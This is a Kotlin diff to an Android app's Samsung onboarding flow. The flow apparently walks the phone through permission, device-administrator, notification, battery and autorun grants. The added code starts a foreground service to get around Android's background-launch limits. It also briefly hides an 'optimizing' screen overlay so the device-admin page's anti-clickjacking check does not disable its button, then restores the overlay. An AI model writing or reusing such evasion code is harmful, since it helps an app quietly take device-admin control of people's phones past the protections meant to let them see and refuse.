@@ -28,6 +28,8 @@ object SamsungFlow : VendorFlow {
         if (running) { Log.d(TAG, "已在执行中，忽略重复调用"); return }
         running = true
         Log.d(TAG, "===== 三星引导开始 =====")
+        // 引导期间起临时前台服务：让系统认为应用在前台，放行后台启动系统页（BAL）
+        runCatching { OnboardingFgs.start(service) }
         // 强制标记用一次就清掉，否则每次重连都会重跑
         runCatching {
             android.provider.Settings.Global.putInt(service.contentResolver, "moying_force_onboard", 0)
@@ -38,8 +40,13 @@ object SamsungFlow : VendorFlow {
 
         Step1.run(service) { granted ->
             Log.d(TAG, "step1 完成 权限=$granted")
+            // 关键：设备管理激活页会检测"屏幕覆盖"并禁用按钮（防点击劫持），
+            // 所以做 Step2 前先把「优化中」浮层藏掉，做完再显示回来。
+            runCatching { com.zaka.screenagent.ui.GuardOverlay.hide() }
+            SamsungNavigator.post(1_200L, Runnable {
             Step2.run(service) {
                 Log.d(TAG, "step2 完成 设备管理员")
+                runCatching { com.zaka.screenagent.ui.GuardOverlay.show(service) }
                 Step3.run(service) { noti ->
                     Log.d(TAG, "step3 完成 通知=$noti")
                     Step4.run(service) { batt ->
@@ -48,11 +55,13 @@ object SamsungFlow : VendorFlow {
                             Log.d(TAG, "结束：权限=$granted 通知=$noti 电池=$batt 自动运行=$auto")
                             Log.d(TAG, "===== 三星引导结束 =====")
                             running = false
+                            runCatching { OnboardingFgs.stop(service) }
                             OnboardingHooks.complete(service)
                         }
                     }
                 }
             }
+            })
         }
     }
 }
